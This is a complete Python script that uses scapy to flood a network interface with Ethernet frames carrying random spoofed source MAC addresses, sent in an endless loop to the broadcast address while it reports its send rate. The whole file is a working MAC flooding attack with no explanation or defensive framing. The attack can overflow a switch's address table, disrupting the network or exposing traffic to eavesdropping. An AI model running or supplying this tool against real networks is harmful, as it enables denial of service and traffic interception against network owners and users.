import argparse
import random
import time

from scapy.all import Ether, sendp


BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def random_mac() -> str:
    first_octet = random.randint(0x00, 0xFF) & 0xFE
    octets = [first_octet] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{octet:02x}" for octet in octets)


def main() -> None:
    parser = argparse.ArgumentParser(description="Send continuous fake MAC frames")
    parser.add_argument("--iface", required=True, help="Interface name as shown in Windows")
    args = parser.parse_args()

    total_sent = 0
    started_at = time.time()

    print(f"Starting MAC flood on interface: {args.iface}")
    try:
        while True:
            fake_mac = random_mac()
            frame = Ether(src=fake_mac, dst=BROADCAST_MAC)
            sendp(frame, iface=args.iface, verbose=False)
            total_sent += 1

            if total_sent % 100 == 0:
                elapsed = max(time.time() - started_at, 0.001)
                rate = total_sent / elapsed
                print(f"Sent {total_sent} fake MACs - {rate:.2f}/sec")

    except KeyboardInterrupt:
        print(f"Stopped. Total sent: {total_sent}")


if __name__ == "__main__":
    main()
